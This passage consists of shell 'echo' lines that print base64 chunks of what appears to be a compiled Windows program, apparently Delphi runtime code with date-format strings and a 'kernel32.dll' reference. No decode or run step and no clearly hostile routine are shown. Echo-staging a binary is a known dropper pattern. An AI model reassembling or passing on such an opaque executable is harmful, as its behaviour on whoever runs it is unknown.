echo 6Kf1//9Zi0UIUKGchkEA6Fz5//9Z6aYAAACAPYGGQQAAD4SZAAAAi0UIULiBhkEA
echo ugEAAADocvX//1npgAAAAIA9jIZBAAB0d4tFCFC4jIZBALoBAAAA6FD1//9Z62GL
echo dfzrHiX/AAAAD6MFBEFBAHMNi0X86LIcAACJRfzrA/9F/ItF/IoAhMB0BTpF+3XU
echo i0UIUItV/CvWi8boDPX//1mLRfyAOAB0F/9F/OsSi0UIUI1F+7oBAAAA6O30//9Z
echo i0X8igCEwA+F+vj//4tFCP+I+P7//zPAWllZZIkQaHiMQACNRdi6AgAAAOj4rf//
echo w+n2p///6+teW4vlXcMAAEFNL1BNAAAAQS9QAEFNUE0AAAAAQUFBQQAAAABBQUEA
echo IAAAAFWL7IHE+P7//1NWi9qL8DPAiYX8/v//M8CJhfj+//+F23QLVYvD6CH4//9Z
echo 6wxVuPyMQADoE/j//1mNlQD///+LxouN/P7//+hDrv//XluL5V3CCAAAAABDAAAA
echo VYvs/3UM/3UIM9LolP///13CCABTVleL+ovwix/rAUOLxui5r///O9h/B4B8Hv8g
echo dO2JH19eW8NVi+yDxPRTVleJTfiJVfyL+MZF9wCLRQjGAACLVfyLx+i3////i138
echo ixsz9usXi8YDwI0EgDPSilQf/2aD6jBmA8KL8EOLx+hcr///O9h/EYpEH/8E0CwK
echo cwdmgf7oA3LNi0X8Oxh+HYvDi1X8ixIqwotVCIgCi0X8iRiLRfhmiTDGRfcBikX3
echo X15bi+VdwgQAjUAAVYvsg8T4U1ZXM9uJXfiL+YvyiUX8M8BVaEWOQABk/zBkiSAz
echo 24X/dDqL1otF/OgV////jUX4UIvH6Nau//+LyIsWi0X86Cqx//+LVfiLx+hE2///
echo hcB1C4vH6LWu//8BBrMBM8BaWVlkiRBoTI5AAI1F+OgArP//w+kipv//6/CLw19e
echo W1lZXcONQABTVldRiAwki/qL8DPbi9eLxuim/v//i8boa67//zsHfA+LB4pEBv86
echo BCR1BP8HswGLw1pfXlvDkFNWV4vwM9u/AQAAAOspikQ+/yTfLER0Gv7IdAosCHQO
echo LAx0BusQswLrGrMC6xYz2+sSswHrDkeLxugSrv//O/h+zDPbi8NfXlvDi8BTVova
echo i/DrI4sDikQG/yX/AAAAD6MFBEFBAHMNixOLxujvGQAAiQPrAv8Di8bo0q3//zsD
echo fAyLA4pEBv8E0CwKc8ZeW8ONQABTVldVUYvoM8CJBCS/BwAAALtIh0EAvmSHQQCD
echo OwB0KYvF6JWv//9QiwPoja///1roCxoAAIXAdAeLBokEJOsJg8YEg8MET3XSiwQk
echo Wl1fXlvDi8BVi+xTi9iDPTyHQQASdTqD+2N/JOiH8f//D7fIi0UIi0D8mTPCK8ID
echo yIvBuWQAAACZ9/lrwGQD2ItFCIN4/AB+DotFCPdY/OsGi0UI/0j8i0UIi0D8A8Nb
echo XcOLwFWL7IPE2FNWVzPbiV3YiV3ciV3giV3kiU34i9qL8DPAVWjvkkAAZP8wZIkg
echo M/9mx0XuAABmx0XsAADGRegAxkX3AKGEhkEA6HD+//+IRfYzwIlF/IM9hIZBAAB0
echo PqGEhkEAgDhndTSL04vG6Jj+//+NReBQiwtJugEAAACLxujprv//i0XgjVXk6FLZ
echo //+LReTouv7//4lF/OscixWEhkEAuAiTQADorRgAAIXAfgihZIdBAIlF/I1F61CN
echo TfSL04vG6J38//+EwA+EMQIAAIvTig2BhkEAi8bopv3//4TAD4QaAgAAjUXqUI1N
echo 8ovTi8bobvz//4TAD4QCAgAAi9OKDYGGQQCLxuh3/f//hMAPhM4AAACNRelQjU3w
echo i9OLxug//P//hMAPhNMBAACKRfYsAXIIdCL+yHQ661Jmi33wikXpiEXoZotF9GaJ
echo Re5mi0XyZolF7Os2Zot98IpF6YhF6GaLRfJmiUXuZotF9GaJRezrGmaLffSKReuI
echo Rehmi0XyZolF7maLRfBmiUXsg338AH4OVQ+3x+gH/v//WYv463CAfegCd2rol+//
echo /w+3yA+3BdBAQQAryIvBUblkAAAAmff5WWZrwGRmA/hmgz3QQEEAAHY8D7fHO8h+
echo NWaDx2TrL+hc7///i/iAffYBdRJmi0X0ZolF7GaLRfJmiUXu6xBmi0X0ZolF7maL
echo RfJmiUXsi9OKDYGGQQCLxuhj/P//i9OLxugW+///gD1Eh0EAAA+EswAAAIsVhIZB
echo ALgUk0AA6K2t//+FwA+EmwAAAKGYhkEAigAE0CwKcxKL04vG6KP8///pgAAAAOsC
echo /wOLxuiXqv//OwN8CYsDgHwG/yB16ovTi8botfr//4vG6Hqq//87A3xUjUXcUKGQ
echo hkEA6Giq//+LyIsTi8bovaz//4tV3KGQhkEA6NTW//+FwHQqjUXYUKGUhkEA6D6q
echo //+LyIsTi8bok6z//4tV2KGUhkEA6KrW//+FwHWEi0X4UGaLTexmi1Xui8fo6+v/
echo /4hF9zPAWllZZIkQaPaSQACNRdi6BAAAAOh6p///w+l4of//6+uKRfdfXluL5V3D
echo /////wEAAABlAAAA/////wMAAABkZGQAU1ZXVYPE8IkMJIvyi+gz24PP/4vWiw2Q
echo hkEAi8Xokvr//4TAdRKL1rn8lEAAi8XogPr//4TAdAQz/+sqi9aLDZSGQQCLxehp
echo +v//hMB1EovWuQiVQACLxehX+v//hMB0Bb8MAAAAhf98CYvWi8Xoifn//41EJAxQ
echo jUwkCIvWi8Xom/n//4TAD4RFAQAAZsdEJAYAAGbHRCQIAABmx0QkCgAAi9aKDYyG
echo QQCLxeiP+v//hMB0dI1EJAxQjUwkCovWi8XoWfn//4TAD4QDAQAAi9aKDYyGQQCL
echo xehi+v//hMB0R41EJAxQjUwkDIvWi8XoLPn//4TAD4TWAAAAi9aKDX+GQQCLxeg1
echo +v//hMB0Go1EJAxQjUwkDovWi8Xo//j//4TAD4SpAAAAhf99U4vWiw2QhkEAi8Xo
echo ePn//4TAdRKL1rn8lEAAi8XoZvn//4TAdAQz/+sqi9aLDZSGQQCLxehP+f//hMB1
echo EovWuQiVQACLxeg9+f//hMB0Bb8MAAAAhf98JGaDfCQEAHRGZoN8JAQMdz5mg3wk
echo BAx1B2bHRCQEAABmAXwkBIvWi8XoS/j//2aLRCQKUItEJARQZotMJBBmi1QkDmaL
echo RCQM6Mzo//+L2IvDg8QQXV9eW8P/////AgAAAEFNAAD/////AgAAAFBNAABTVlGL
echo 8ovYxwQkAQAAAIvOi9SLw+jz/f//hMB0DIvD6LCn//87BCR8BDPA6wKwAVpeW8OQ
echo U1ZXg8Toi/qL8LMBxwQkAQAAADPAiUQkEIlEJBSNTCQIi9SLxuhq+v//hMB0HYvG
echo 6Gun//87BCR8Ho1MJBCL1IvG6JH9//+EwHUNi9eLxuh4////i9jrJ91EJAjYHciV
echo QADf4J5yDd1EJAjcRCQQ3R+b6wvdRCQI3GQkEN0fm4vDg8QYX15bwwAAAABTgcQA
echo ////i9pqAGgAAQAAjVQkCFJqAFBqAGgAMgAA6NDB///rAUiFwH4OilQE/4DqIXLy
echo gOoNdO2L1IvLkeglpf//gcQAAQAAW8OQVYvsgcQA////U1aL8YtdCGgAAQAAjY0A
echo ////UVJQ6NXB//+FwH4Si8hJjZUA////i8Po5aT//+sJi8OL1ug+pP//XluL5V3C
echo BACLwFNWV1GL2Yvyi/hqAo1EJARQVlfolMH//4XAfgWKBCTrAovDWl9eW8NVi+xR
echo U1ZXiU38i/qL8ItdCFOLRRCLQPwzyYvW6Gv///+DOwB1DYtF/IsEuIvT6P28//9f
echo XltZXcIIAJBVi+wzyVFRUVFRUVNWVzPAVWjbl0AAZP8wZIkg6FfB//+JRfy7AQAA
echo AL6ghkEAv9CGQQBVaguNRfRQuXxBQQCL00qNQ0RI6Hn///9Zi1X0i8boeqP//1Vq
echo C41F8FC5rEFBAIvTSo1DOEjoVv///1mLVfCLx+hXo///Q4PHBIPGBIP7DXWuuwEA
echo AAC+AIdBAL8ch0EAjUMFuQcAAACZ9/mJVfhVagaNRexQudxBQQCL00qLRfiDwDHo
echo CP///1mLVeyLxugJo///VWoGjUXoULn4QUEAi9NKi0X4g8Aq6OP+//9Zi1Xoi8fo
echo 5KL//0ODxwSDxgSD+wh1nDPAWllZZIkQaOKXQACNRei6BAAAAOiOov//w+mMnP//
echo 6+tfXluL5V3DjUAAVYvsU1Yz9rsBAAAA6waD+wd0H0ODPJ1Eh0EAAHXwjQSdRIdB
echo AItVCOgjpP//vgEAAACLxl5bXcIEAIvAVYvsagBTVjPAVWiNmEAAZP8wZIkgM/a7
echo AQAAAOsGg/sHdCxDgzydYIdBAP918I1F/ItVCOjbo///i0X8M9LoIdP//4kEnWCH
echo QQC+AQAAADPAWllZZIkQaJSYQACNRfzouKH//8Pp2pv//+vwi8ZeW1ldwgQAjUAA
echo VYvsagBWM8BVaDeZQABk/zBkiSCNRfxQ6IO///+5TJlAALoLEAAA6Ez9//+LRfy6
echo AQAAAOiz0v//i/CLxoPA/YPoA3M8agRW6FO///9QaOyXQADowL7//7oHAAAAuGSH
echo QQDHAP////+DwARKdfRqA1boKr///1BoKJhAAOiXvv//M8BaWVlkiRBoPplAAI1F
echo /OgOof//w+kwm///6/BeWV3DAAD/////AQAAADEAAABVi+wzyVFRUVFRU1ZXi/qL
echo 8DPAVWgam0AAZP8wZIkguwEAAACLx+jJoP//jUX4UOi8vv//uTCbQAC6CRAAAOiF
echo /P//i0X4ugEAAADo7NH//4PA/YPoAw+CRAEAAKE8h0EAg+gEdAyDwPOD6AJyBDPA
echo 6wKwAYTAdDXrI4pEHv8sR3QaLCB0Fo1F9IpUHv/oSqL//4tV9IvH6Pyi//9Di8bo
echo 7KL//zvYftLpAgEAAIvHi9bokqD//+n0AAAAikQe/yX/AAAAD6MFBEFBAHMui9OL
echo xuiODgAAiUX8jUXwUItN/IvTi8boB6X//4tV8IvH6KWi//8DXfzppQAAALo0m0AA
echo jUQe/7kCAAAA6MrV//+FwHUPi8e6QJtAAOh6ov//Q+t+ukSbQACNRB7/uQQAAADo
echo pNX//4XAdRGLx7pUm0AA6FSi//+DwwPrVrpcm0AAjUQe/7kCAAAA6HzV//+FwHUP
echo i8e6aJtAAOgsov//Q+swikQe/yxZdAQsIHUOi8e6dJtAAOgRov//6xaNReyKVB7/
echo 6Eeh//+LVeyLx+j5of//Q4vG6Omh//872A+ODP///zPAWllZZIkQaCGbQACNRey6
echo BAAAAOhPn///w+lNmf//6+tfXluL5V3D/////wEAAAAxAAAAZ2cAAP////8DAAAA
echo Z2dnAHl5eXkAAAAA/////wQAAABlZWVlAAAAAHl5AAD/////AgAAAGVlAAD/////
echo AQAAAGUAAACFwHQFLQAQAADDi8BVi+yBxKj7//9TVleJTfyL2ovwahyNhdD8//9Q
echo U+jyvP//gb3g/P//ABAAAHUcaAUBAACNhe79//9Qi4XU/P//UOhOvP//hcB1I2gF
echo AQAAjYXu/f//UKFghkEAUOgzvP//i8PojP///4lF+OsJK53U/P//iV34jYXu/f//
echo slzo/Q0AAIvQQo2F8/7//7kEAQAA6NrT//+7BJ1AAL8EnUAAi8aLFUBcQADo65T/
echo /4TAdCGLRgToo6L//4vYi8PohtP//4XAdAyAfAP/LnQFvwidQABoAAEAAI2F7vz/
echo /1CheHVBAItABFChYIZBAOjvrP//UOhlvP//jZWo+///iwbogJL//42FqPv//4mF
echo qPz//8aFrPz//wSNhfP+//+JhbD8///GhbT8//8Gi0X4iYW4/P//xoW8/P//BYmd
echo wPz//8aFxPz//waJvcj8///Ghcz8//8GjYWo/P//UGoEjY3u/P//i1UIi0X86CLY
echo //+LRfzo0tL//19eW4vlXcIEAAAAAAAALgAAAIHEvPv//2gABAAAjUwkSOhk/v//
echo oRR1QQCAOAB0XqE0dEEA6GyM///o44n//41EJERQjUQkSFDoeLv//2oAjUQkBFCN
echo RCRM6HTS//9QjUQkUFBq9OjLuv//UOhFu///agCNRCQEUGoCaNCdQABq9Oiwuv//
echo UOgqu///6zZqQI1EJAhQoRB0QQCLQARQoWCGQQDowqv//1DoOLv//2gQIAAAjUQk
echo CFCNRCRMUGoA6Cq7//+BxEQEAADDAAAA/////wIAAAANCgAAU1ZXhNJ0CIPE8Oj1
echo k///i/GL2ov4jUcEi9bopZz//4vHhNt0D+gylP//ZI8FAAAAAIPEDIvHX15bw4vA
echo VYvsagBTVleE0nQIg8Tw6LST//+L8Yvai/gzwFVoap5AAGT/MGSJII1F/FCLVQyL
echo TQiLxugL1///i1X8jUcE6ESc//8zwFpZWWSJEGhxnkAAjUX86Nub///D6f2V///r
echo 8IvHhNt0D+i0k///ZI8FAAAAAIPEDIvHX15bWV3CCABTVleE0nQIg8Tw6DmT//+L
echo 8Yvai/iNVwSLxugNtf//i8eE23QP6HaT//9kjwUAAAAAg8QMi8dfXlvDi8BVi+xq
echo AGoAU1ZXhNJ0CIPE8Oj2kv//i/GL2ov4M8BVaDifQABk/zBkiSCNRfxQjVX4i8bo
echo uLT//4tF+ItVDItNCOhC1v//i1X8jUcE6Hub//8zwFpZWWSJEGg/n0AAjUX4ugIA
echo AADoMZv//8PpL5X//+vri8eE23QP6OaS//9kjwUAAAAAg8QMi8dfXltZWV3CCACQ
echo gHgMAHQF6NmP///DcJ9AAA4JVEVycm9yUmVjCAAAAAEAAAAAEEAABAAAAJBTVoPE
echo +DPb6PiH//+L8OsBQ4P7Bn8JOzTdFEJBAHXxg/sGfxWLDN0YQkEAsgGhYF1AAOgR
echo /v//6x2JNCTGRCQEAFRqAIsNDHRBALIBoWBdQADo6v7//4lwDFlaXlvDi8Dwn0AA
echo DgpURXhjZXB0UmVjCAAAAAEAAAAAEEAABAAAAFOL2ovQ/sp0DP7KdBBKgOoWchLr
echo LIsVjIdBAOsrixWQh0EA6yMl/wAAAI0ExTRCQQCLSASLALIB6Iv9//+L0OsH6Dr/
echo //+L0FOLwulIlP//W8OLwFWL7IPE4FNWVzPbiV3giV38i/mL8ovYM8BVaPygQABk
echo /zBkiSCF23QMjUX8i9PoSZr//+sNjVX8oQh1QQDoGrP//4tF/IlF5MZF6AuJdezG
echo RfALiX30xkX4AI1F5FBqAo1V4KE0dUEA6O+y//+LTeCyAaFoZEAA6DT9//+L2DPA
echo WllZZIkQaAOhQACNReDoUZn//41F/OhJmf//w+lrk///6+iLw19eW4vlXcOJzIkU
echo JIttAOmLk///w4vAVYvs6Dz///+NTQiDwQSLVQjo2v///13CBACLwIsNJHRBALIB
echo ochkQADoRv3//+hVk///w4sAPZIAAMB/LHRZPY4AAMB/FXRTLQUAAMB0VS2HAAAA
echo dDxIdEjrVQVx//8/g+gCcjN0N+tHPZYAAMB/EXQ1LZMAAMB0KEh0E0h0FusvLf0A
echo AMB0JYPoPXQd6yGwA8OwBMOwBcOwBsOwB8OwCMOwCcOwC8OwDMOwDcOwDsOwFsOQ
echo U4vYi8Podv///yX/AAAAiwTFNEJBAFvDVYvsgcSQ/v//U1YzwImFkP7//4mFtP7/
echo /4mFrP7//4mFsP7//4lF/DPAVWijo0AAZP8wZIkgi0UIi1j8g3sUAHUPjVX8oZB1
echo QQDohbH//+sNjVX8ofB0QQDodrH//4tzGGocjUXgUItDDFDoQLb//4F98AAQAAAP
echo hbMAAABoBQEAAI2F2/7//1CLReRQ6J61//+FwA+ElgAAAItDDImFuP7//8aFvP7/
echo /wWNhbD+//+Nldv+//+5BQEAAOgMmv//i4Ww/v//jZW0/v//6CvM//+LhbT+//+J
echo hcD+///GhcT+//8Li0X8iYXI/v//xoXM/v//C4m10P7//8aF1P7//wWNhbj+//9Q
echo agONlaz+//+hKHVBAOi6sP//i42s/v//sgGhoGJAAOj8+v//i9jrWotDDImFlP7/
echo /8aFmP7//wWLRfyJhZz+///GhaD+//8LibWk/v//xoWo/v//BY2FlP7//1BqAo2V
echo kP7//6H0dEEA6F6w//+LjZD+//+yAaGgYkAA6KD6//+L2DPAWllZZIkQaKqjQACN
echo hZD+///oupb//42FrP7//7oDAAAA6M6W//+NRfzoopb//8PpxJD//+vVi8NeW4vl
echo XcOLwFWL7IPE8FMz0olV8IlF/DPAVWhvpEAAZP8wZIkgi0X86Hf9//8l/wAAAIvQ
echo g8L9g+oIcgh0HUqD6gpzIo0ExTRCQQCLSASLALIB6NH5//+L2Os7Vejb/f//WYvY
echo 6zCLRfyLAIlF9MZF+ACNRfRQagCNVfCh1HNBAOiLr///i03wsgGhEF5AAOjQ+f//
echo i9iLw4sVuF1AAOjNjP//hMB0BotF/IlDDDPAWllZZIkQaHakQACNRfDo1pX//8Pp
echo +I///+vwi8Nbi+Vdw41AAOiH+P//uAEAAADonZX//8OLDRR0QQCyAaEEXUAA6O75
echo //+jjIdBAIsNzHRBALIBoYxhQADo1/n//6OQh0EAoeBzQQDHAAygQAChRHRBAMcA
echo gKRAAKEIdEEAixVAXEAAiRChPHRBAMcA0KFAAKFIdEEAxwC0o0AAuByhQACLFeB0
echo QQCJArg4oUAAixXQc0EAiQLDi8CDPYyHQQAAdBqhjIdBAMZADAGhjIdBAIsQ/1L4
echo M8CjjIdBAIM9kIdBAAB0GqGQh0EAxkAMAaGQh0EA6D2K//8zwKOQh0EAoeBzQQAz
echo 0okQoUR0QQAz0okQoQh0QQAz0okQoTx0QQAz0okQoUh0QQAz0okQoeB0QQAz0okQ
echo w41AAIHEbP///8cEJJQAAABU6KGy//+FwHRQi0QkEKO8QEEAi0QkBKPAQEEAi0Qk
echo CKPEQEEAgz28QEEAAXUQi0QkDCX//wAAo8hAQQDrCYtEJAyjyEBBALjMQEEAjVQk
echo FLmAAAAA6LmW//+BxJQAAADDi8BWV4v6M9KFwHRmgDw4AHRghf91FIoAJf8AAAAP
echo owUEQUEAc0yyAetIi/dO6wFOhfZ8EooMMIHh/wAAAA+jDQRBQQBy6YvPK86B4QEA
echo AIB5BUmDyf5Bhcl1BLIC6xOKBDgl/wAAAA+jBQRBQQBzArIBi8JfXsONQABTVovy
echo i9gzwIA9RIdBAAB0D4vD6EyY//+L1kroaP///15bw5AzyYA9RIdBAAB0B+hU////
echo i8iLwcONQABTVovyi9iLw+gblv//O/B+CYvD6BCW//+L8IvWi8PoBQAAAF5bw4vA
echo U1ZXi/KL2DP/hfZ+RYvD6OyV//878H86i/6APUSHQQAAdC+4AQAAADP/O/B8JIpU
echo A/+B4v8AAAAPoxUEQUEAcwuL0IvD6MYBAADrAUBHO/B93IvHX15bw1WL7IPE9FNW
echo V4lN+IlV/Iv4i8fokJX//4lF9L4BAAAAuwEAAADrIUaKRB//Jf8AAAAPowUEQUEA
echo cw2L04vH6HUBAACL2OsBQztd9H0FO3X8fNU7dfx1Iztd9H0eikQf/yX/AAAAD6MF
echo BEFBAHMMi9OLx+hBAQAASIvYi0X4iTCLRQiJGF9eW4vlXcIEAI1AAFNWg8T4i9qL
echo 8DPAiQQkhdt+SovG6P+U//872H8/g/sBfjeAPUSHQQAAdC5UjUwkCIvTSovG6Db/
echo //9LO1wkBH8Mi8bo0JT//zsEJH8HM8CJBCTrCP8EJOsDiRwkiwQkWVpeW8NTVoPE
echo +Ivai/AzwIkEJIXbfkaLxuiblP//O9h+CYvG6JCU//+L2IA9RIdBAAB0JlSNTCQI
echo i9OLxujP/v//i8bocJT//zsEJH0Pi8boZJT//4kEJOsDiRwkiwQkWVpeW8NTi9iA
echo PUSHQQAAdApT6Bqw//8rw1vDuAEAAABbw41AAFDoBrD//8OQU1aL8ovYuAEAAACA
echo PUSHQQAAdCKKVDP/geL/AAAAD6MVBEFBAHMPi8Po/pX//wPGSOii////XlvDjUAA
echo U1aL2ovwjUMBgD1Eh0EAAHQkilQe/4Hi/wAAAA+jFQRBQQBzEYvG6MSV//8Dw0jo
echo aP///wPDXlvDjUAAU1ZXVYvyi9gz/4vD6KOV//9Qi8bom5X//4voi8Va6BUAAACL
echo 2IXbdAWL+yv9R4vHXV9eW8ONQABTVldVg8T4i+qL8DPbhfYPhIEAAACAPgB0fIXt
echo dHiAfQAAdHKLxug9xv//iQQki8XoM8b//4v4i9WLxujcxv//i9jrP4vTK9aLxujt
echo /P//iEQkBIB8JAQCdBVXVVdTagBoAAQAAOi6rf//g/gCdCeAfCQEAXUBQ0OL1YvD
echo 6JvG//+L2IXbdA2LwyvGixQkK9A7+nawM9uLw1laXV9eW8OQU1aL2ovT6B0AAACL
echo 8ITbdBKFwHQOi/BAi9PoCQAAAIXAdfKLxl5bw1NWV4vai/CL04vG6DDG//+L+IX/
echo dCSL1yvWi8boU/z//ywBchV0AusBR0eL04vH6AzG//+L+IX/ddyLx19eW8NVi+yD
echo xPRTM9KJVfQz0lVo0KpAAGT/MmSJImoHjVX5UmgEEAAAUOh5rf//jUX0jVX5uQcA
echo AADoDZL//4tF9FDoGK3//4vQWOjUwP//i9gzwFpZWWSJEGjXqkAAjUX06HWP///D
echo 6ZeJ///r8IvDW4vlXcOLwFWL7FFTVleLfQiDx+xXoTiHQQDodP///1Do0qz//zP2
echo 6ymKRDcGilw3ByrYchpDiEX/ikX/Jf8AAAAPqwUEQUEA/kX//st16oPGAoP+DH0K
echo ikQ3BgpENwd1yF9eW1ldw6E8h0EAg/gfdwcPowX8QkEAD5LAw41AAFWL7IHEaP7/
echo /1NWV8cFOIdBAAkEAADHBTyHQQAJAAAAxwVAh0EAAQAAAOi5rP//hcB0BaM4h0EA
echo ZoXAdBuL0GaB4v8DD7fSiRU8h0EAD7fAwegKo0CHQQC+rKxAAL8EQUEAuQgAAADz
echo pYM9vEBBAAIPhacAAADobf///4TAdBPGBUWHQQAAxgVEh0EAAOm5AAAAVejw/v//
echo WbgEQUEAuqysQACxIOj2fv//D5XDiB1Eh0EAhNt0DMYFRYdBAADpiAAAALiAAAAA
echo jZVs////iAJAQj0AAQAAdfWNhWz///+NlWr+//9SaIAAAABQagKhOIdBAFDo56v/
echo /7iAAAAAjZVq/v//ZoM6Ag+UwYgNRYdBAITJdTaDwgJIdenrLmpK6Fys//+FwA+V
echo wKJFh0EAairoS6z//4XAD5XDiB1Eh0EAhNt0B1XoPv7//1lfXluL5V3DAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7LkIAAAAagBqAEl1+VMzwFVo
echo l69AAGT/MGSJIOhp/v//6NTp//+APUSHQQAAdAXonuv//+g5q///i9iNRfBQM8m6
echo FAAAAIvD6P3o//+LVfC4eIZBAOhwjf//jUXsULmsr0AAuhsAAACLw+jb6P//i0Xs
echo M9LoRb7//6J8hkEAjUXoULmsr0AAuhwAAACLw+i36P//i0XoM9LoIb7//6J9hkEA
echo sSy6DwAAAIvD6Obo//+ifoZBALEuug4AAACLw+jT6P//on+GQQCNReRQuayvQAC6
echo GQAAAIvD6G3o//+LReQz0ujXvf//ooCGQQCxL7odAAAAi8PonOj//6KBhkEAjUXc
echo ULm4r0AAuh8AAACLw+g26P//i0XcjVXg6GPr//+LVeC4hIZBAOiejP//jUXUULnI
echo r0AAuiAAAACLw+gJ6P//i0XUjVXY6Dbr//+LVdi4iIZBAOhxjP//sTq6HgAAAIvD
echo 6C/o//+ijIZBAI1F0FC54K9AALooAAAAi8Poyef//4tV0LiQhkEA6DyM//+NRcxQ
echo ueyvQAC6KQAAAIvD6Kfn//+LVcy4lIZBAOgajP//jUX46L6L//+NRfTotov//41F
echo yFC5rK9AALolAAAAi8Podef//4tFyDPS6N+8//+FwHUPjUX8uvivQADoHoz//+sN
echo jUX8ugSwQADoD4z//41FxFC5rK9AALojAAAAi8PoNuf//4tFxDPS6KC8//+FwHU/
echo jUXAULmsr0AAugUQAACLw+gT5///i0XAM9Lofbz//4XAdQ+NRfS6ELBAAOi8i///
echo 6w2NRfi6ILBAAOiti////3X4/3X8aDCwQAD/dfS4mIZBALoEAAAA6FSO////dfj/
echo dfxoPLBAAP919LichkEAugQAAADoN47//7EsugwAAACLw+jt5v//okaHQQAzwFpZ
echo WWSJEGier0AAjUXAuhAAAADo0or//8Pp0IT//+vrW4vlXcMA/////wEAAAAwAAAA
echo /////wYAAABtL2QveXkAAP////8MAAAAbW1tbSBkLCB5eXl5AAAAAP////8CAAAA
echo YW0AAP////8CAAAAcG0AAP////8BAAAAaAAAAP////8CAAAAaGgAAP////8FAAAA
echo IEFNUE0AAAD/////BQAAAEFNUE0gAAAA/////wMAAAA6bW0A/////wYAAAA6bW06
echo c3MAAP8l3MJBAIvAVYvsg8TsUzPAiUXsM8BVaNywQABk/zBkiSDolaf//4vYhdt0
echo N4ld8MZF9ACNVeyLw+hK5f//i0XsiUX4xkX8C41F8FBqAYsNAHVBALIBoYBlQADo
echo KO7//4vQ6xSLDWR1QQCyAaGAZUAA6Nbt//+L0IlaDIvC6N6D//8zwFpZWWSJEGjj
echo sEAAjUXs6GmJ///D6YuD///r8FuL5V3DU4vYhdt1BehY////i8Nbw1O7AENBAOsQ
echo iwOLEIkTuggAAADoOHX//4M7AHXrW8OQU2hQsUAA6P2m//+L2IXbdBBoYLFAAFPo
echo 9Kb//6MoQUEAgz0oQUEAAHUKuFhvQACjKEFBAFvDAABrZXJuZWwzMi5kbGwAAAAA
echo R2V0RGlza0ZyZWVTcGFjZUV4QQC6AQAAAJLwD8ECQMO6/////5LwD8ECSMOHEInQ
echo w41AAJLwD8ECw4vAU1ZXVeibgP//i9qL+DP2i2y3BDPAiUS3BIXtdA6LxYttAOiF
echo dP//he118kaD/hB13ovTgOL8i8fop33//4TbfgeLx+hEgP//XV9eW8ONQABVi+xR
echo 6Oul//9miUX+ikX+MkX/JA9ZXcNTVldVUYkUJIv4i8fo1////4vY6MSl//+L8DPA
echo isOLbIcE6wOLbQCF7XQFO3UEdfSF7XU4i8foTQAAAIvohe11K7gQAAAA6M21//+L
echo 6Il1BMdFCP///3+JbQAzwIrDjUSHBIvV6B////+JRQCLBCSJKFpdX15bw5CLAjPJ
echo iUgEiwIz0olQCMOQU4vYi8PoVv///yX/AAAAi1yDBIXbdCSNQwi6////f+jc/v//
echo Pf///390Cugkpf//iUME6waLG4XbddyLw1vDkFNWhNJ0CIPE8Oj+fv//i9qL8DPS
echo i8boeXz//8dGDP//AABqAGr/av9qAOiVpP//iUYQagBqAGoAagDohaT//4lGFMdG
echo GP////+yAaGMZkAA6D98//+JRiCLxoTbdA/oAX///2SPBQAAAACDxAyLxl5bw4vA
echo U1bo+X7//4vai/CLxuh6AAAAi9OA4vyLxugifP//i0YQUOgZpP//i0YUUOgQpP//
echo i0Yg6Bh8//+E234Hi8bopX7//15bw4vAi0AQUOjfpP//w4vAi0AQUOjjpP//w4vA
echo i0AUUOjXpP//w4vAi1AYUotAEFDo56T//8OLwItQGFKLQBRQ6Nek///Di8BTVldV
echo UYv4swHoBqT//4vwO3ckdHyLx+ig////i28oi9SLRyDoD/7//4sEJIN4DAAPl8OE
echo 23QijUcM6Gn9///rGI1HDLr//wAA6Hr9//+FwHQHi8fol////41HDLoBAP//6GL9
echo //89//8AAHXUi8foSP///4TbdAiNRwzoNP3//4l3JI1HKOgd/f//SDvFD5TD/0cc
echo i8NaXV9eW8NTUYvYi9SLQyDojv3///9LHIN7HAB1IDPAiUMkjUMMuv//AADoA/3/
echo /4vD6Aj///+Lw+j1/v//iwQkg3gMAHUKi9SLQyDoyv3//1pbw41AAFNWUYvwi9SL
echo RiDoPf3//4sEJP9ADIsEJIN4DAEPl8PoBKP//ztGJHQ9hNt1OYvG6MD+///rJI1G
echo DOh+/P//Pf//AAB1B4vG6Jz+//9qAOg5+///i8bomv7//41GDOhm/P//hcB+0Fpe
echo W8OLwFNRi9iL1ItDIOjS/P//iwQk/0gMiwQkg3gMAHVIi9SLQyDoMf3//+iQov//
echo O0MkdDSNQwzoF/z//4vIgfn//wAAdQmLw+gy/v//6xmFyX8Vi8G5//8AAJn3+YXS
echo dQeLw+gX/v//WlvDixAzyYkIi8Lo93n//8OLwB0AAAD4QkEA5HRBAPBCQQCAdEEA
echo 6EJBANRzQQDgQkEACHVBANhCQQAcdUEA0EJBACh0QQDIQkEAbHRBAMBCQQCwc0EA
echo uEJBAIx0QQCwQkEAqHRBAKhCQQBQdEEAoEJBAFh0QQCYQkEATHVBAJBCQQBUdEEA
echo iEJBAHx1QQCAQkEA1HRBAHhCQQDAdEEAcEJBAIR1QQBoQkEAaHVBAGBCQQBkdEEA
echo WEJBAFB1QQBQQkEAWHVBAEhCQQAcdEEAQEJBAPhzQQA4QkEAvHRBADBCQQAEdUEA
echo KEJBALxzQQAgQkEASHVBABhCQQBgdEEAKAAAABBCQQA8dUEAAAAAAAxCQQDcc0EA
echo AAAAAAhCQQD8dEEAAAAAAARCQQDIc0EAAAAAAABCQQAEdEEAAAAAAPxBQQD8c0EA
echo AAAAAPhBQQDkc0EAAAAAAPRBQQBcdEEAAAAAAPBBQQDQdEEAAAAAAOxBQQAAdEEA
echo AAAAAOhBQQC0dEEAAAAAAORBQQAYdUEAAAAAAOBBQQAQdUEAAAAAANxBQQDcdEEA
echo AAAAANhBQQBMdEEAAAAAANRBQQA4dEEAAAAAANBBQQDEc0EAAAAAAMxBQQAMdUEA
echo AAAAAMhBQQCUdEEAAAAAAMRBQQAwdEEAAAAAAMBBQQCIdEEAAAAAALxBQQDIdEEA
echo AAAAALhBQQCQdEEAAAAAALRBQQBAdEEAAAAAALBBQQDAc0EAAAAAAKxBQQB0dEEA
echo AAAAAKhBQQBcdUEAAAAAAKRBQQA4dUEAAAAAAKBBQQCwdEEAAAAAAJxBQQAYdEEA
echo AAAAAJhBQQDMc0EAAAAAAJRBQQAwdUEAAAAAAJBBQQCUdUEAAAAAAIxBQQDoc0EA
echo AAAAAIhBQQCsc0EAAAAAAIRBQQBAdUEAAAAAAIBBQQCsdEEAAAAAAHxBQQBwdUEA
echo AAAAAFhBQQBodEEAAAAAAFRBQQAgdEEAAAAAAFWL7DPAVWjhuUAAZP8wZIkg/wWI
